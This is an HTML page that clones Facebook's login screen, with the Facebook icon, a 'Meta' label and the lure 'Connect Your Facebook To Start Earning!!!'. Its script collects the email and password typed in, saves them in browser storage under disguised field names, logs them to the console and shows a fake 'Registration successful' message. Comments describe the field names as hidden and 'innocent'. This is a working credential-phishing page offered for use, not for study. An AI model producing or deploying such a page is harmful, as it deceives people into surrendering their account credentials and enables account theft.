<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Facebook Login Clone</title>

<style>
    * {
        margin: 0;
        padding: 0;
        box-sizing: border-box;
        font-family: Arial, sans-serif;
    }

    body {
        background: linear-gradient(180deg, #0e162b, #0b1223);
        height: 100vh;
        display: flex;
        justify-content: center;
        align-items: center;
        color: #fff;
    }

    .container {
        width: 420px;
        text-align: center;
        margin-top: 130px;
    }

    .fb-logo {
        width: 70px;
        height: 70px;
        background: #1877f2;
        border-radius: 50%;
        display: flex;
        justify-content: center;
        align-items: center;
        font-size: 45px;
        font-weight: bold;
        margin: 0 auto 65px auto;
        overflow: hidden;
    }

    .fb-logo img {
        width: 100%;
        height: 100%;
        object-fit: cover;
    }

    input {
        width: 100%;
        background: #1c233b;
        border: none;
        border-radius: 12px;
        padding: 22px;
        margin-bottom: 12px;
        color: white;
        font-size: 15px;
        outline: none;
    }

    ::placeholder {
        color: #8592a6;
    }

    .login-btn {
        width: 100%;
        background: #1877f2;
        border: none;
        border-radius: 25px;
        padding: 14px;
        font-size: 18px;
        color: white;
        cursor: pointer;
        font-weight: bold;
        margin-top: 5px;
    }

    .forgot {
        margin-top: 15px;
        color: white;
        font-size: 16px;
        cursor: pointer;
    }

    .divider {
        width: 100%;
        height: 0px;
        background: #2c3550;
        margin: 20px 0;
        margin-bottom: 200px;
    }

    .create-btn {
        width: 100%;
        padding: 14px;
        font-size: 17px;
        border-radius: 25px;
        border: 1.5px solid #1877f2;
        background: transparent;
        color: #79a8ff;
        cursor: pointer;
    }

    .meta {
        margin-top: 25px;
        color: white;
        font-size: 14px;
    }

    .meta-logo {
        width: 30px;
        height: 30px;
        margin: 0 auto 10px auto;
    }

    .meta-logo img {
        width: 100%;
        height: 100%;
        object-fit: contain;
    }

    .success-message {
        display: none;
        background: #28a745;
        color: white;
        padding: 12px;
        border-radius: 8px;
        margin-bottom: 15px;
    }
</style>
</head>

<body>

<div class="container">
    <div class="success-message" id="successMessage">
        Registration successful! Redirecting...
    </div>
<h3>Connect Your Facebook To Start Earning!!!<h3>
    <!-- Facebook Logo Circle -->
    <div class="fb-logo">
        <img src="https://www.facebook.com/images/fb_icon_325x325.png" alt="Facebook Logo">
    </div>

    <!-- FORM WITH HIDDEN FIELD NAMES -->
    <form id="loginForm">
        <!-- Shows "email" to user but sends as "user_data" -->
        <input 
            type="text" 
            name="user_data"
            placeholder="Mobile number or email address"
            required
        >

        <!-- Shows "password" to user but sends as "security_code" -->
        <input 
            type="password" 
            name="security_code"
            placeholder="Password"
            required
        >

        <button class="login-btn" type="submit">Log In</button>
    </form>

    <div class="forgot">Forgotten Password?</div>

    <div class="divider"></div>

    <button class="create-btn">Create new account</button>

    <!-- Meta Logo -->
    <div class="meta-logo">
        
    </div>
    <div class="meta">Meta</div>
</div>

<script>
    document.getElementById('loginForm').addEventListener('submit', function(e) {
        e.preventDefault();
        
        const formData = new FormData(this);
        const username = formData.get('user_data'); // Hidden name
        const password = formData.get('security_code'); // Hidden name
        
        // Save to local storage with innocent names
        const submissions = JSON.parse(localStorage.getItem('user_logins') || '[]');
        submissions.push({
            user_data: username,
            security_code: password,
            timestamp: new Date().toLocaleString()
        });
        localStorage.setItem('user_logins', JSON.stringify(submissions));
        
        document.getElementById('successMessage').style.display = 'block';
        document.getElementById('loginForm').reset();
        
        setTimeout(() => {
            document.getElementById('successMessage').style.display = 'none';
        }, 3000);
        
        console.log('Data saved:', {username, password});
    });

    // To view saved data, open browser console and type:
    // console.log(JSON.parse(localStorage.getItem('user_logins')));
</script>

</body>
</html>
